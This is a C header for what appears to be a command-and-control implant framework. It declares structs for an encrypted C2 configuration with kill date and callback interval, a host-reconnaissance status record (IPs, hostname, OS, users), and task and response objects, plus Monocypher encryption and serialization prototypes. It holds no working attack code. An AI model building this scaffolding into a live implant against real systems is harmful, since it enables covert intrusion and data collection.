#ifndef SINDARIN_H
#define SINDARIN_H

#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>

// Fixed size types matching Nim/Python
typedef struct {
    uint8_t data[32];
} Key;

typedef struct {
    uint8_t data[24];
} Nonce;

typedef struct {
    uint8_t data[16];
} Mac;

// EncObj - Encryption object
typedef struct {
    Key publicKey;
    Nonce nonce;
    Mac mac;
    int64_t cipherLen;
    uint8_t* cipherText;
} EncObj;

// EncConfig - Encrypted configuration (ref object in Nim)
typedef struct {
    Key privKey;
    Key pubKey;
    EncObj encObj;
} EncConfig;

// StaticConfig - Static configuration (ref object in Nim)
typedef struct {
    char* buildID;
    char* deploymentID;
    Key c2PubKey;
    int32_t killEpoch;
    int32_t interval;
    char* callback;
} StaticConfig;

// Status - Status information
typedef struct {
    char* ip;
    char* externalIP;
    char* hostname;
    char* os;
    char* arch;
    char* users;
    int64_t bootTime;
} Status;

// Callback - Callback object (ref object in Nim)
typedef struct {
    StaticConfig* config;
    Status* status;
} Callback;

// Task - Task object
typedef struct {
    char* taskId;
    int64_t taskNum;
    bool retrieved;
    bool complete;
    char* arg;
    char* resp;
} Task;

// Resp - Response object
typedef struct {
    char* taskId;
    char* resp;
} Resp;

// Serialization buffer for handling dynamic memory
typedef struct {
    uint8_t* data;
    size_t size;
    size_t capacity;
} SerBuffer;

// Function declarations for memory management
void free_enc_obj(EncObj* obj);
void free_enc_config(EncConfig* config);
void free_static_config(StaticConfig* config);
void free_status(Status* status);
void free_callback(Callback* callback);
void free_task(Task* task);
void free_resp(Resp* resp);

// Flatty serialization functions
SerBuffer* ser_buffer_create(size_t initial_capacity);
void ser_buffer_free(SerBuffer* buf);
void ser_buffer_append(SerBuffer* buf, const uint8_t* data, size_t len);
void ser_buffer_append_byte(SerBuffer* buf, uint8_t byte);

// Serialization functions
uint8_t* serialize_enc_config(EncConfig* config, size_t* out_len);
uint8_t* serialize_static_config(StaticConfig* config, size_t* out_len);
uint8_t* serialize_status(Status* status, size_t* out_len);
uint8_t* serialize_callback(Callback* callback, size_t* out_len);
uint8_t* serialize_task(Task* task, size_t* out_len);
uint8_t* serialize_resp(Resp* resp, size_t* out_len);
uint8_t* serialize_enc_obj(EncObj* obj, size_t* out_len);

// Deserialization functions
EncConfig* deserialize_enc_config(const uint8_t* data, size_t len);
StaticConfig* deserialize_static_config(const uint8_t* data, size_t len, size_t* offset);
Status* deserialize_status(const uint8_t* data, size_t len, size_t* offset);
Callback* deserialize_callback(const uint8_t* data, size_t len);
Task* deserialize_task(const uint8_t* data, size_t len);
Resp* deserialize_resp(const uint8_t* data, size_t len);
EncObj* deserialize_enc_obj(const uint8_t* data, size_t len, size_t* offset);

// Encryption functions (using Monocypher)
void generate_key_pair(Key* priv_key, Key* pub_key);
EncObj* encrypt_message(const Key* sender_priv, const Key* recipient_pub,
                        const uint8_t* message, size_t msg_len);
uint8_t* decrypt_message(const Key* priv_key, const EncObj* enc_obj, size_t* out_len);

// Utility functions
void key_from_bytes(Key* key, const uint8_t* bytes);
void nonce_from_bytes(Nonce* nonce, const uint8_t* bytes);
void mac_from_bytes(Mac* mac, const uint8_t* bytes);

#endif // SINDARIN_H
